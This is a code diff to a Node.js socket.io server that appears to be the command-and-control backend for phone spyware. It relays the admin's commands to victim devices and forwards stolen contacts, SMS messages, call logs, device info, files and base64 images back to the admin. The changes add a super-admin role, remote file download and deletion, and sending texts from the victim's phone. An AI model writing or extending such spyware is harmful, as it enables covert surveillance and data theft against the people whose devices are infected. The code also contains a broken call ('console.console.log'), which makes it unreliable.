@@ -14,6 +14,10 @@ const device_socket_ids = {};
 
 var admin_socket_id;
 var admin_status = false;
+
+var super_admin_socket_id;
+var super_admin_status = false;
+
 var call_ones = false;
 
 io.on("connection", (socket) => {
@@ -55,80 +59,80 @@ io.on("connection", (socket) => {
     console.log("admin_connected");
   });
 
+  //super_admin_connect
+  socket.on("super_admin_connect", () => {
+    super_admin_socket_id = socket.id;
+    super_admin_status = true;
+  });
   //send command
   socket.on("send_command", (command, to_device) => {
     io.to(device_secure_ids[to_device]).emit(command);
     console.log(command);
     console.log(to_device);
   });
-  socket.on("files_list",(list,typ)=>{
-    io.to(admin_socket_id).emit("files_l",list,typ)
-    console.log(list)
-    console.log(typ)
-  })
-  socket.on("dir_change",(dir,too)=>{
-    console.log(dir);
-    io.to(device_secure_ids[too]).emit("change_dir",dir);
-
-  })
-  socket.on("new_files",(list,typ) =>{
+  socket.on("files_list", (list, typ) => {
+    io.to(admin_socket_id).emit("files_l", list, typ);
     console.log(list);
-    console.log(typ)
-    io.to(admin_socket_id).emit("new_dir",list,typ);
-  })
-  socket.on("empty_dir", ()=>{
+  });
+  socket.on("dir_change", (dir, too) => {
+    console.log(dir);
+    io.to(device_secure_ids[too]).emit("change_dir", dir);
+  });
+  socket.on("new_files", (list, typ) => {
+    console.log(list);
+    io.to(admin_socket_id).emit("new_dir", list, typ);
+  });
+
+  socket.on("empty_dir", () => {
     io.to(admin_socket_id).emit("empty_dir");
-    console.log("empty dir")
+    console.log("empty dir");
+  });
 
-  })
-  socket.on("not_dir", ()=>{
+  socket.on("not_dir", () => {
     io.to(admin_socket_id).emit("not_dir");
-    console.log("not dir")
+    console.log("not dir");
+  });
 
-  })
-  socket.on("send_image_bitmap",(path,too)=>{
+  socket.on("send_image_bitmap", (path, too) => {
     //receive_image_bitmap
-    io.to(device_secure_ids[too]).emit("send_img_bit",path);
-    console.log("dfsfds")
+    io.to(device_secure_ids[too]).emit("send_img_bit", path);
+  });
 
-  })
-  socket.on("base64_image",(base)=>{
-    io.to(admin_socket_id).emit("receive_image_bitmap",base);
-    console.log(base)
+  socket.on("base64_image", (base) => {
+    io.to(admin_socket_id).emit("receive_image_bitmap", base);
+  });
 
-  })
-  socket.on("multi_del_c",()=>{
+  socket.on("multi_del_c", () => {
     io.to(admin_socket_id).emit("multi_del_comp");
+  });
 
-  })
-  socket.on("delete_file_multi", (def_path,data,too)=>{
-    console.log(data)
-    io.to(device_secure_ids[too]).emit("delete_multi",def_path,data);
-   
-  })
-  
-  socket.on("spy_contacts_data", (cname,cdata)=>{
-    io.to(admin_socket_id).emit("contacts_data", cdata ,cname);
-    console.log(cdata)
-    console.log(cname)
+  socket.on("delete_file_multi", (def_path, data, too) => {
+    io.to(device_secure_ids[too]).emit("delete_multi", def_path, data);
+  });
+  socket.on("download_file_multi", (def_path, data, too) => {
+    io.to(device_secure_ids[too]).emit("download_multi", def_path, data);
+    console.console.log("path " + def_path + ", data " + data);
+  });
 
-  })
+  socket.on("spy_contacts_data", (cname, cdata) => {
+    io.to(admin_socket_id).emit("contacts_data", cdata, cname);
+  });
 
-  socket.on("spy_messages_data", (cnumber,cname, cdate ,cdata)=>{
-    io.to(admin_socket_id).emit("messages_data",cnumber,cname,cdate,cdata);
-    console.log(cnumber);
-    console.log(cname);
-    console.log(cdate);
-    console.log(cdata);
-  })
+  socket.on("spy_messages_data", (cnumber, cname, cdate, cdata) => {
+    io.to(admin_socket_id).emit("messages_data", cnumber, cname, cdate, cdata);
+  });
+
+  socket.on("spy_device_info", (data) => {
+    io.to(admin_socket_id).emit("device_info_data", data);
+  });
+
+  socket.on("send_message", (too, number, data) => {
+    io.to(device_secure_ids[too]).emit("send_message_spy", number, data);
+  });
+
   socket.on(
     "spy_call_logs",
-    (number_list, name_list, call_type, duration_list,date) => {
-      console.log(name_list);
-      console.log(number_list);
-      console.log(duration_list);
-      console.log(call_type);
-      console.log(date)
+    (number_list, name_list, call_type, duration_list, date) => {
       io.to(admin_socket_id).emit(
         "call_logs_data",
         number_list,
@@ -137,12 +141,15 @@ io.on("connection", (socket) => {
         date,
         call_type
       );
-     
     }
   );
 
   //disconnect Event
   socket.on("disconnect", function (reason) {
+    if (socket.id == super_admin_socket_id) {
+      super_admin_status = false;
+      console.log("super admin disconnected " + reason);
+    }
     if (socket.id == admin_socket_id) {
       console.log("admin disconnected " + reason);
       admin_status = false;
@@ -158,8 +165,6 @@ io.on("connection", (socket) => {
           " Reason " +
           reason
       );
-      io.to(admin_socket_id).emit("ok")
-
     }
   });
 
